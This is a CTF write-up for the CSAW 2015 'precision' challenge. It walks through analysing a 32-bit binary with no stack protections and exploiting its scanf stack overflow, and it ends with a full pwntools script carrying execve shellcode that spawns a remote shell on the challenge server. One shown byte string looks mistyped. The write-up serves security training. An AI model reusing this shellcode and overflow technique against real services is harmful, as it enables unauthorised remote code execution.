#CSAWCTF 2015 Quals: precision

----------
## Challenge details
Category: Exploitables

Points:   100

**Description:**
>*nc 54.210.15.77 1259*
>
>*Updated again!*
>
>*[precision_a8f6f0590c177948fe06c76a1831e650](challenge/precision)*

## Writeup
It looks like we're given a 32-bit linux executable.

```bash
[alokpathy@lawn-143-215-63-181 2015]$ file precision
precision: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped
```

Let's run it and see what it does.
```bash
[alokpathy@lawn-143-215-63-181 2015]$ ./precision 
Buff: 0xff8bac38

```

It prints out what looks like the adderss of some buffer and asks for some input through ```stdin```. Let's see what happens what I just give it AAA.

```bash
[alokpathy@lawn-143-215-63-181 2015]$ ./precision 
Buff: 0xff8bac38
AAAA
Got AAAA
```
It just prints out what we typed in. Not exactly sure how that helps. Before we bring up IDA, let's see what we can learn about this file.

```bash
[alokpathy@lawn-143-215-63-181 2015]$ readelf -l precision

Elf file type is EXEC (Executable file)
Entry point 0x8048420
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00774 0x00774 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00140 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000698 0x08048698 0x08048698 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
```

```bash
[alokpathy@lawn-143-215-63-181 2015]$ ~/Documents/checksec.sh/checksec --file precision
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY	FORTIFIED FORTIFY-able  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		2	precision
```

Awesome, we have an executable stack, no canary or PIE, and disabled NX. Not many restrictions at all on this.

Let's pull up IDA and see what that gives us.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+18h] [bp-88h]@1
  double v5; // [sp+98h] [bp-8h]@1

  v5 = 64.33333;
  setvbuf(stdout, 0, 2, 0);
  printf("Buff: %p\n", &v4);
  __isoc99_scanf("%s", &v4);
  if ( 64.33333 != v5 )
  {
    puts("Nope");
    exit(1);
  }
  return printf(str, &v4);
}
```

It's calling ```scanf``` to bring in a string from ```stdin```? That's definitely vulnerable. We can input arbitrary length strings now. All we need is for ```v5``` to continue being ```64.333```, but that doesn't change at all in the program, so it should be fine.

```bash
[alokpathy@lawn-143-215-63-181 2015]$ python -c 'print "A"*200' | ./precision 
Buff: 0xffe0c9e8
Nope
```

Huh? Is ```v5``` not equal to ```64.333``` anymore? But ```v5``` isn't even referenced anywhere else in the code? 

When we inputted such a large string into ```precision```, we overwrote values on the stack that normally would not be. One of which, in this case, is ```v5```. So ```v5``` would not be equal to ```64.333``` after we put in 200 A's into ```stdin```. It sort of acts like a stack canary by itself. This presents a small issue, though, since we'd like to overwrite EIP, which is located after ```v5``` on the stack. To overcome this, we can simply input ```64.333``` as part of out input when we hit ```v5```on the stack. 

So our exploit looks like the following:

```
(shellcode)(buffer)(64.3333)(more bufferbuffer)(pointer to shellcode)
```

Simple enough. Note that our shellcode must not contain anything that ```scanf``` interprets as whitespace (e.g. ```0xb0```). Also, although ASLR is enabled on the server, we are provided with the pointer to the beginning of the buffer through ```stdout```.

Thus, our exploit code becomes the following:

```python
from pwn import *
import binascii

sock = remote("54.173.98.115", 1259)

buff_addr_str = sock.recvline()
buff_addr = buff_addr_str[8:16]

byte1 = buff_addr[0:2]
byte2 = buff_addr[2:4]
byte3 = buff_addr[4:6]
byte4 = buff_addr[6:8]

# Pointer to shellcode
hex_buff_addr = binascii.unhexlify(byte4) + binascii.unhexlify(byte3) + binascii.unhexlify(byte2) + binascii.unhexlify(byte1) 

# Shellcode
shellcode = "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
 
# Hexadecimal of 64.333
canary_hex = "\xa5\x31\x5a\x47\x55\x15\x50x\x40"

payload = shellcode + "A"*93 + canary_hex +"A"*12 + hex_buff_addr

sock.send(payload)
sock.interactive()
```

Running this python script launches a shell on the server, and opening the flag file on that gives us the flag:

```flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}```



